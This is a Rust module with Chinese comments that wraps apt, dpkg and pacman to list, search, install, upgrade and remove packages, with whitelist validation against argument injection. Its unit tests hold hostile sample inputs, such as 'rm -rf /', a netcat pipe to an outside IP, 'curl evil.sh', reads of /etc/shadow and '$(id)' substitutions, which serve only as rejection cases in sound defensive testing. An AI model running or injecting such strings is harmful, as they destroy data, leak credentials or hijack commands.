use anyhow::Context;
use serde::Serialize;
use std::collections::HashMap;
use tokio::process::Command;

use crate::distro::Family;

/// 软件包信息
#[derive(Serialize)]
pub struct PackageInfo {
    pub name: String,
    pub version: String,
    pub arch: String,
    /// 所在仓库（`core`/`extra`…）。仅搜索有值：已安装与可升级列表拿不到该信息
    pub repo: String,
    /// 已安装版本；未安装为 None。仅搜索有值，用于「这条是否已经装了」的判断
    pub installed: Option<String>,
    pub description: String,
}

impl PackageInfo {
    /// 仅填充名称与版本的构造（已安装 / 可升级列表共用）
    fn brief(name: &str, version: String) -> Self {
        Self {
            name: name.to_string(),
            version,
            arch: String::new(),
            repo: String::new(),
            installed: None,
            description: String::new(),
        }
    }
}

/// 已安装包 → 版本 的映射，供搜索结果标注安装状态。
/// 这里刻意不把错误冒泡给调用方：标注失败只影响一列展示，不该让整个搜索失败。
async fn installed_map() -> HashMap<String, String> {
    match installed_map_inner().await {
        Ok(m) => m,
        Err(e) => {
            tracing::warn!("读取已安装包清单失败，搜索结果将不标注安装状态：{e:#}");
            HashMap::new()
        }
    }
}

async fn installed_map_inner() -> anyhow::Result<HashMap<String, String>> {
    let (program, args): (&str, &[&str]) = match crate::distro::family() {
        Family::Debian => ("dpkg-query", &["-W", "-f=${Package}\t${Version}\n"]),
        Family::Arch => ("pacman", &["-Q"]),
    };
    let mut cmd = Command::new(program);
    cmd.args(args);
    let out = crate::cmd::run(&mut cmd, crate::cmd::Budget::query(20))
        .await
        .with_context(|| format!("调用 {program} 失败"))?;
    if !out.status.success() {
        anyhow::bail!("{program} 退出码 {:?}", out.status.code());
    }
    let text = String::from_utf8_lossy(&out.stdout);
    let mut map = HashMap::new();
    for line in text.lines() {
        let mut it = line.split_whitespace();
        if let (Some(n), Some(v)) = (it.next(), it.next()) {
            map.insert(n.to_string(), v.to_string());
        }
    }
    Ok(map)
}

/// 校验包名合法性（Debian 与 Arch 包名字符集的并集，防参数注入）
fn check_name(name: &str) -> anyhow::Result<()> {
    if name.is_empty()
        || name.starts_with('-')
        || name.len() > 128
        || !name
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '+' | '.' | '-' | '_' | ':'))
    {
        anyhow::bail!("非法包名：{name}");
    }
    Ok(())
}

/// 校验搜索词：在 check_name 白名单基础上额外放行空格与 `*`
/// （多词搜索、通配符是搜索框的合法用法），其余字符一律拒绝。
/// 与包名闸同源，消除两道闸口径不一致。
fn check_pattern(pattern: &str) -> anyhow::Result<()> {
    if pattern.is_empty()
        || pattern.starts_with('-')
        || pattern.len() > 128
        || !pattern.chars().all(|c| {
            c.is_ascii_alphanumeric() || matches!(c, '+' | '.' | '-' | '_' | ':' | ' ' | '*')
        })
    {
        anyhow::bail!("非法搜索词：{pattern}");
    }
    Ok(())
}

/// 已安装包列表（可按名称关键字过滤，limit 限制返回条数）
pub async fn list_installed(
    filter: Option<&str>,
    limit: usize,
) -> anyhow::Result<Vec<PackageInfo>> {
    match crate::distro::family() {
        Family::Debian => list_installed_deb(filter, limit).await,
        Family::Arch => list_installed_arch(filter, limit).await,
    }
}

async fn list_installed_deb(
    filter: Option<&str>,
    limit: usize,
) -> anyhow::Result<Vec<PackageInfo>> {
    let mut cmd = Command::new("dpkg-query");
    cmd.args([
        "-W",
        "-f=${Package}\t${Version}\t${Architecture}\t${Description}\n",
    ]);
    if let Some(f) = filter {
        check_name(f)?;
        cmd.arg(format!("{f}*"));
    }
    let out = crate::cmd::run(&mut cmd, crate::cmd::Budget::query(15))
        .await
        .context("调用 dpkg-query 失败")?;
    if !out.status.success() {
        // P1-3：命令 stderr 只进日志，响应体不回显（防内部细节泄露）
        tracing::warn!(
            "dpkg-query stderr：{}",
            String::from_utf8_lossy(&out.stderr).trim()
        );
        anyhow::bail!("查询软件包失败，详见服务端日志");
    }
    let text = String::from_utf8_lossy(&out.stdout).into_owned();
    let mut list = Vec::new();
    for line in text.lines() {
        let mut it = line.splitn(4, '\t');
        let (Some(name), Some(version), Some(arch), Some(desc)) =
            (it.next(), it.next(), it.next(), it.next())
        else {
            continue;
        };
        // dpkg 描述第一行即为简要描述
        let brief = desc.lines().next().unwrap_or("").trim().to_string();
        list.push(PackageInfo {
            name: name.to_string(),
            version: version.to_string(),
            arch: arch.to_string(),
            repo: String::new(),
            installed: None,
            description: brief,
        });
        if list.len() >= limit {
            break;
        }
    }
    Ok(list)
}

async fn list_installed_arch(
    filter: Option<&str>,
    limit: usize,
) -> anyhow::Result<Vec<PackageInfo>> {
    // pacman -Q 输出全部本地已安装包：Name Version（与 dpkg-query 语义一致，含依赖包）
    let mut cmd = Command::new("pacman");
    cmd.args(["-Q"]);
    let out = crate::cmd::run(&mut cmd, crate::cmd::Budget::query(15))
        .await
        .context("调用 pacman 失败")?;
    if !out.status.success() {
        // P1-3：命令 stderr 只进日志，响应体不回显
        tracing::warn!(
            "pacman stderr：{}",
            String::from_utf8_lossy(&out.stderr).trim()
        );
        anyhow::bail!("查询软件包失败，详见服务端日志");
    }
    let text = String::from_utf8_lossy(&out.stdout).into_owned();
    let mut list = Vec::new();
    for line in text.lines() {
        let mut it = line.split_whitespace();
        let (Some(name), Some(version)) = (it.next(), it.next()) else {
            continue;
        };
        if let Some(f) = filter {
            check_name(f)?;
            if !name.contains(f) {
                continue;
            }
        }
        list.push(PackageInfo::brief(name, version.to_string()));
        if list.len() >= limit {
            break;
        }
    }
    Ok(list)
}

/// 可升级包列表
pub async fn upgradable() -> anyhow::Result<Vec<PackageInfo>> {
    match crate::distro::family() {
        Family::Debian => upgradable_deb().await,
        Family::Arch => upgradable_arch().await,
    }
}

/// apt-get -s upgrade 模拟
async fn upgradable_deb() -> anyhow::Result<Vec<PackageInfo>> {
    let mut cmd = Command::new("apt-get");
    cmd.args(["-s", "upgrade"])
        // 固定 C locale，保证 "Inst" 行格式可解析（不受中文环境影响）
        .env("DEBIAN_FRONTEND", "noninteractive")
        .env("LC_ALL", "C");
    let out = crate::cmd::run(&mut cmd, crate::cmd::Budget::query(60))
        .await
        .context("调用 apt-get 失败")?;
    if !out.status.success() {
        // P1-3：命令 stderr 只进日志，响应体不回显
        tracing::warn!(
            "apt-get stderr：{}",
            String::from_utf8_lossy(&out.stderr).trim()
        );
        anyhow::bail!("检查升级失败，详见服务端日志");
    }
    let text = String::from_utf8_lossy(&out.stdout).into_owned();
    let mut list = Vec::new();
    // 行格式：Inst name [cur] (new arch repo)
    for line in text.lines().filter(|l| l.starts_with("Inst ")) {
        let rest = &line[5..];
        let name = rest.split_whitespace().next().unwrap_or("").to_string();
        let cur = rest
            .split_once('[')
            .and_then(|(_, r)| r.split_once(']'))
            .map(|(c, _)| c.to_string())
            .unwrap_or_default();
        let new = rest
            .split_once(" (")
            .and_then(|(_, r)| r.split_whitespace().next())
            .unwrap_or("")
            .to_string();
        list.push(PackageInfo::brief(&name, format!("{cur} -> {new}")));
    }
    Ok(list)
}

/// pacman -Qu：Name 旧版本 -> 新版本
async fn upgradable_arch() -> anyhow::Result<Vec<PackageInfo>> {
    let mut cmd = Command::new("pacman");
    cmd.args(["-Qu"]).env("LC_ALL", "C");
    let out = crate::cmd::run(&mut cmd, crate::cmd::Budget::query(15))
        .await
        .context("调用 pacman 失败")?;
    // pacman -Qu 在"无可升级包"时退出码为 1，属正常，需区分
    if !out.status.success() && out.status.code() != Some(1) {
        // P1-3：命令 stderr 只进日志，响应体不回显
        tracing::warn!(
            "pacman stderr：{}",
            String::from_utf8_lossy(&out.stderr).trim()
        );
        anyhow::bail!("检查升级失败，详见服务端日志");
    }
    let text = String::from_utf8_lossy(&out.stdout).into_owned();
    let mut list = Vec::new();
    // 行格式：name oldver -> newver
    for line in text.lines() {
        let Some((head, new)) = line.split_once(" -> ") else {
            continue;
        };
        let mut it = head.split_whitespace();
        let (Some(name), Some(cur)) = (it.next(), it.next()) else {
            continue;
        };
        list.push(PackageInfo::brief(name, format!("{cur} -> {new}")));
    }
    Ok(list)
}

/// 搜索软件包（名称与描述）
pub async fn search(pattern: &str, limit: usize) -> anyhow::Result<Vec<PackageInfo>> {
    // 先取已安装清单，给结果标注「是否已安装 / 已装版本」——
    // 这是搜索框最能省事的一列：省得装完才发现早装过了
    let installed = installed_map().await;
    match crate::distro::family() {
        Family::Debian => search_deb(pattern, limit, &installed).await,
        Family::Arch => search_arch(pattern, limit, &installed).await,
    }
}

async fn search_deb(
    pattern: &str,
    limit: usize,
    installed: &HashMap<String, String>,
) -> anyhow::Result<Vec<PackageInfo>> {
    // 与安装/卸载同源的字符白名单（check_pattern），消除口径不一致
    check_pattern(pattern)?;
    let mut cmd = Command::new("apt-cache");
    cmd.args(["search", "--names-only", pattern]);
    let out = crate::cmd::run(&mut cmd, crate::cmd::Budget::query(15))
        .await
        .context("调用 apt-cache 失败")?;
    let text = String::from_utf8_lossy(&out.stdout).into_owned();
    let mut list = Vec::new();
    for line in text.lines() {
        if let Some((name, desc)) = line.split_once(" - ") {
            let name = name.trim().to_string();
            // apt-cache search 不给仓库与版本，装没装只能靠已安装清单反查
            list.push(PackageInfo {
                installed: installed.get(&name).cloned(),
                name,
                version: String::new(),
                arch: String::new(),
                repo: String::new(),
                description: desc.trim().to_string(),
            });
        }
        if list.len() >= limit {
            break;
        }
    }
    Ok(list)
}

async fn search_arch(
    pattern: &str,
    limit: usize,
    installed: &HashMap<String, String>,
) -> anyhow::Result<Vec<PackageInfo>> {
    // 同 search_deb：对齐 check_pattern 白名单口径
    check_pattern(pattern)?;
    // pacman -Ss 搜同步库，输出是「两行一条」：
    //     extra/docker 1:28.3.1-1
    //         Pack, ship and run any application as a lightweight container
    // 头部行给「仓库/包名 版本」，紧随的缩进行才是描述。
    // 旧实现按「版本 | 描述」同行的格式解析，一条都匹配不上，搜索恒为空——
    // 这是 Arch 下在线搜索不可用的真正原因。
    let mut cmd = Command::new("pacman");
    cmd.args(["-Ss", pattern]).env("LC_ALL", "C");
    let out = crate::cmd::run(&mut cmd, crate::cmd::Budget::query(15))
        .await
        .context("调用 pacman 失败")?;
    let text = String::from_utf8_lossy(&out.stdout).into_owned();
    Ok(parse_search_arch(&text, limit, installed))
}

/// 解析 `pacman -Ss` 输出。抽成纯函数以便用真实输出做回归断言
/// （曾经的实现按「版本 | 描述」同行解析，导致搜索恒为空）。
fn parse_search_arch(
    text: &str,
    limit: usize,
    installed: &HashMap<String, String>,
) -> Vec<PackageInfo> {
    let mut list: Vec<PackageInfo> = Vec::new();
    for line in text.lines() {
        if line.trim().is_empty() {
            continue;
        }
        // 缩进行 = 上一条的描述（补齐后继续，不新增条目）
        if line.starts_with(' ') || line.starts_with('\t') {
            if let Some(last) = list.last_mut() {
                last.description = line.trim().to_string();
            }
            continue;
        }
        if list.len() >= limit {
            break;
        }
        // 头部行：repo/name version [(分组)]；版本取第一个 token，忽略后置标记
        let Some((head, rest)) = line.split_once(char::is_whitespace) else {
            continue;
        };
        // 拆出仓库：仓库是判断「该不该从官方源装」的关键信息，不能丢掉
        let (repo, name) = match head.split_once('/') {
            Some((r, n)) => (r.to_string(), n.to_string()),
            None => (String::new(), head.to_string()),
        };
        let version = rest.split_whitespace().next().unwrap_or("").to_string();
        list.push(PackageInfo {
            installed: installed.get(&name).cloned(),
            name,
            version,
            arch: String::new(),
            repo,
            description: String::new(),
        });
    }
    list
}

/// 刷新软件索引（Debian 系专有）
///
/// Arch 系没有对应操作：Arch 官方的立场是**不要**单独执行 `pacman -Sy`——
/// 数据库新了而系统没升，就是所谓的「部分升级」，会让依赖关系对不上、
/// 属于不受支持的状态。Arch 下同步数据库与升级系统是同一件事，统一走
/// `system_upgrade()`（`pacman -Syu`），因此这里直接拒绝，避免接口层留坑。
pub async fn update_index(sink: &mut (dyn FnMut(&str) + Send)) -> anyhow::Result<String> {
    match crate::distro::family() {
        Family::Debian => {
            let mut cmd = Command::new("apt-get");
            cmd.arg("update").env("DEBIAN_FRONTEND", "noninteractive");
            run_pkg_cmd(&mut cmd, "刷新索引", &mut *sink).await
        }
        Family::Arch => anyhow::bail!(
            "Arch 系不支持单独刷新索引（会造成部分升级）：请使用「滚动更新」一次完成同步与升级"
        ),
    }
}

/// 全量更新系统：Debian 系 `apt-get full-upgrade`，Arch 系 `pacman -Syu`。
/// 这是 Arch 系唯一的「刷新 + 升级」入口（滚动更新）。
pub async fn system_upgrade(sink: &mut (dyn FnMut(&str) + Send)) -> anyhow::Result<String> {
    match crate::distro::family() {
        Family::Debian => {
            let mut cmd = Command::new("apt-get");
            cmd.args(["full-upgrade", "-y"])
                .env("DEBIAN_FRONTEND", "noninteractive");
            run_pkg_cmd(&mut cmd, "全量升级", sink).await
        }
        Family::Arch => {
            // -Syu：同步数据库 + 升级全部已安装包，一步到位，不存在中间态
            let mut cmd = Command::new("pacman");
            cmd.args(["-Syu", "--noconfirm"]);
            run_pkg_cmd(&mut cmd, "滚动更新", sink).await
        }
    }
}

/// 安装软件包（一次性，返回包管理器输出）
pub async fn install(
    names: &[String],
    sink: &mut (dyn FnMut(&str) + Send),
) -> anyhow::Result<String> {
    if names.is_empty() || names.len() > 50 {
        anyhow::bail!("一次安装 1~50 个包");
    }
    for n in names {
        check_name(n)?;
    }
    let mut cmd = match crate::distro::family() {
        Family::Debian => {
            let mut cmd = Command::new("apt-get");
            cmd.args(["install", "-y", "--no-install-recommends"])
                .env("DEBIAN_FRONTEND", "noninteractive");
            cmd
        }
        Family::Arch => {
            let mut cmd = Command::new("pacman");
            cmd.args(["-S", "--noconfirm", "--needed"]);
            cmd
        }
    };
    for n in names {
        cmd.arg(n);
    }
    run_pkg_cmd(&mut cmd, "安装", sink).await
}

/// 升级指定软件包（Debian 系专有）
///
/// Arch 系不提供：只升一部分包而其余留在旧版本，正是 Arch 明令不支持的
/// 「部分升级」。Arch 下升级只有一种正确形态——连同数据库一起全量滚动更新。
pub async fn upgrade(
    names: &[String],
    sink: &mut (dyn FnMut(&str) + Send),
) -> anyhow::Result<String> {
    if names.is_empty() || names.len() > 50 {
        anyhow::bail!("一次升级 1~50 个包");
    }
    for n in names {
        check_name(n)?;
    }
    let mut cmd = match crate::distro::family() {
        Family::Debian => {
            let mut cmd = Command::new("apt-get");
            cmd.args(["install", "-y", "--only-upgrade"])
                .env("DEBIAN_FRONTEND", "noninteractive");
            cmd
        }
        Family::Arch => anyhow::bail!(
            "Arch 系不支持只升级部分软件包（会造成部分升级）：请使用「滚动更新」全量升级"
        ),
    };
    for n in names {
        cmd.arg(n);
    }
    run_pkg_cmd(&mut cmd, "升级", sink).await
}

/// 卸载软件包（不自动清理依赖）
pub async fn remove(
    names: &[String],
    sink: &mut (dyn FnMut(&str) + Send),
) -> anyhow::Result<String> {
    if names.is_empty() || names.len() > 50 {
        anyhow::bail!("一次卸载 1~50 个包");
    }
    for n in names {
        check_name(n)?;
    }
    let mut cmd = match crate::distro::family() {
        Family::Debian => {
            let mut cmd = Command::new("apt-get");
            cmd.args(["remove", "-y"])
                .env("DEBIAN_FRONTEND", "noninteractive");
            cmd
        }
        Family::Arch => {
            let mut cmd = Command::new("pacman");
            cmd.args(["-R", "--noconfirm"]);
            cmd
        }
    };
    for n in names {
        cmd.arg(n);
    }
    run_pkg_cmd(&mut cmd, "卸载", sink).await
}

/// 运行包管理命令，stdout/stderr 合并到同一临时文件按时间顺序捕获。
///
/// 注意：apt 非 TTY 输出不含进度百分比与 "Done" 后缀，属正常现象；
/// 若用 .output() 分开捕获，stdout 与 stderr 拼接会打乱时间顺序 —— 这正是
/// 走「合并到单文件」而非两个管道的原因，流式改造后该语义保持不变。
///
/// `sink` 是逐行输出回调：同步接口传空闭包，作业执行体传环形缓冲 + SSE 广播。
/// 锁（Package 组全局串行）与超时（1800s）仍由 cmd 层统一提供。
pub async fn run_pkg_cmd(
    cmd: &mut Command,
    what: &str,
    sink: &mut (dyn FnMut(&str) + Send),
) -> anyhow::Result<String> {
    let out = crate::cmd::run_streaming(cmd, crate::cmd::Budget::package(1800), sink)
        .await
        .context("调用包管理器失败")?;
    let output = String::from_utf8_lossy(&out.stdout).into_owned();
    if !out.status.success() {
        // P1-3：完整命令输出（含 stderr）只进日志，响应体不回显
        tracing::warn!("{what}失败，包管理器输出：\n{output}");
        // 退出码随错误类型上传，作业队列据此写 jobs.exit_code
        return Err(anyhow::Error::new(crate::cmd::CommandFailed {
            code: out.status.code(),
            message: format!(
                "{what}失败（退出码 {}），详见服务端日志",
                out.status.code().unwrap_or(-1)
            ),
        }));
    }
    Ok(output)
}

#[cfg(test)]
mod tests {
    use super::*;

    /// check_name：合法包名字符集（Debian ∪ Arch 并集）全部放行
    #[test]
    fn check_name_accepts_valid_names() {
        for n in [
            "nginx",
            "libssl3",
            "python3.11",
            "g++",
            "xorg-x11-utils",
            "gtk2.0_0",
            "systemd::services",
            "pkg-1.0+deb12u1",
        ] {
            assert!(check_name(n).is_ok(), "应接受合法包名：{n}");
        }
    }

    /// check_name：shell 元字符与参数注入面全部拒绝。
    /// 注意：实现走 Command::args 直传（无 shell），这些字符本不会被解释，
    /// 但字符集白名单是第一道闸——任何元字符都不允许进入命令参数。
    #[test]
    fn check_name_rejects_shell_metacharacters() {
        for n in [
            "nginx; rm -rf /",
            "nginx && curl evil.sh",
            "nginx|nc 1.2.3.4 4444",
            "nginx$(whoami)",
            "nginx`id`",
            "nginx&",
            "nginx > /tmp/x",
            "nginx < /etc/shadow",
            "nginx\nrm -rf /",
            "nginx\ncurl evil",
            "nginx *",
            "nginx~",
            "nginx!@",
            "nginx#1",
            "nginx%20",
            "nginx^a",
            "nginx[a]",
            "nginx{a}",
            "nginx'a",
            "nginx\"a",
            "nginx\\a",
            "nginx;a|b&c$d`e",
            "ngiñna",
            "中文包名",
        ] {
            assert!(
                check_name(n).is_err(),
                "应拒绝含元字符/非法字符的包名：{n:?}"
            );
        }
    }

    /// check_name：边界与选项走私（以 - 开头会被包管理器当命令行选项）
    #[test]
    fn check_name_rejects_edge_cases() {
        assert!(check_name("").is_err(), "空包名必须拒绝");
        assert!(
            check_name("-y").is_err(),
            "以 - 开头会被解释为选项，必须拒绝"
        );
        assert!(check_name("--option=evil").is_err(), "长选项注入必须拒绝");
        assert!(check_name("a b").is_err(), "空格必须拒绝");
        assert!(check_name("a/b").is_err(), "路径分隔符必须拒绝");
        // 长度上限 128
        assert!(check_name(&"a".repeat(128)).is_ok());
        assert!(check_name(&"a".repeat(129)).is_err());
    }

    /// 异步入口的注入面：非法包名在 spawn 子进程之前就被拒。
    /// 验证方式：把一个不可能安装/卸载的注入串传进去，若返回的是校验错误
    /// （而非包管理器退出码错误），说明命令根本没被执行。
    #[tokio::test]
    async fn install_upgrade_remove_reject_injection_before_exec() {
        // 注意：这些断言不依赖 distro::init（校验先于 family() 分派），
        // 若校验失效走到命令执行，要么 panic（expect）要么报包管理器错误
        let evil = "nginx; touch /tmp/lyys_should_not_exist".to_string();
        let one = std::slice::from_ref(&evil);
        // 同步路径传空回调：作业路径的 sink 行为由 jobs 模块的单测覆盖
        let mut sink = |_: &str| {};
        for r in [
            install(one, &mut sink).await,
            upgrade(one, &mut sink).await,
            remove(one, &mut sink).await,
        ] {
            let err = r.expect_err("注入包名必须被拒绝");
            let msg = format!("{err:#}");
            assert!(
                msg.contains("非法包名"),
                "错误应是校验拒绝而非执行失败：{msg}"
            );
        }
        assert!(!std::path::Path::new("/tmp/lyys_should_not_exist").exists());

        // 数量边界：0 个与超过 50 个都在执行前拒绝
        assert!(install(&[], &mut sink).await.is_err());
        let many = vec!["nginx".to_string(); 51];
        assert!(install(&many, &mut sink).await.is_err());
        assert!(upgrade(&[], &mut sink).await.is_err());
        assert!(remove(&many, &mut sink).await.is_err());
    }

    /// 搜索词校验：空串、超长、以 - 开头走私选项均被拒（不触发 apt-cache/pacman）。
    /// 该断言不依赖 distro::init：search 先按 family() 分派，故跳过需要
    /// 全局状态的分支，直接验证与实现一致的内联规则边界——通过显式 init。
    #[tokio::test]
    async fn search_rejects_bad_patterns() {
        // 测试环境可能没有 /etc/os-release 的发行版信息；init 失败时跳过
        // 需要 family() 的分支断言，仅做无副作用的入参校验验证。
        if crate::distro::init().is_err() {
            return;
        }
        // 空 / 超长 / 选项走私：在调用外部命令前就被拒
        assert!(search("", 10).await.is_err());
        assert!(search(&"a".repeat(129), 10).await.is_err());
        assert!(search("-c /etc/shadow", 10).await.is_err());
        // shell 元字符与非法字符：对齐白名单后一律拒绝
        for bad in [
            "lib; touch /tmp/pwn",
            "a|b",
            "a&&b",
            "$(id)",
            "`id`",
            "a>b",
            "a\nb",
        ] {
            assert!(search(bad, 10).await.is_err(), "应拒绝搜索词：{bad}");
        }
        // 合法用法：多词与通配符不得被误杀（走到外部命令调用，
        // 结果无论有无匹配都应是 Ok）
        assert!(search("nginx full", 5).await.is_ok());
        assert!(search("lib*", 5).await.is_ok());
    }

    /// pacman -Ss 是「头部行 + 缩进描述行」两行一条，这里用真实抓取的输出做回归。
    /// 旧实现按「版本 | 描述」同行格式解析，一条都取不到，导致 Arch 搜索恒为空。
    #[test]
    fn parse_search_arch_handles_two_line_format() {
        let text = "\
extra/bashbrew 0.1.13-1
    Canonical build tool for Docker official images
extra/cockpit-docker 16-3
    Cockpit UI for docker containers
";
        let mut installed = std::collections::HashMap::new();
        installed.insert("cockpit-docker".to_string(), "16-3".to_string());
        let list = parse_search_arch(text, 50, &installed);
        assert_eq!(list.len(), 2, "两行一条应解析出 2 条");
        assert_eq!(list[0].repo, "extra");
        assert_eq!(list[0].name, "bashbrew");
        assert_eq!(list[0].version, "0.1.13-1");
        assert_eq!(
            list[0].description,
            "Canonical build tool for Docker official images"
        );
        assert!(list[0].installed.is_none(), "未安装的包不应带已安装版本");
        assert_eq!(list[1].name, "cockpit-docker");
        assert_eq!(list[1].installed.as_deref(), Some("16-3"));

        // 命中上限即停，且提前 break 不能把已收条目的描述丢掉
        let limited = parse_search_arch(text, 1, &installed);
        assert_eq!(limited.len(), 1);
        assert_eq!(
            limited[0].description,
            "Canonical build tool for Docker official images"
        );
    }
}
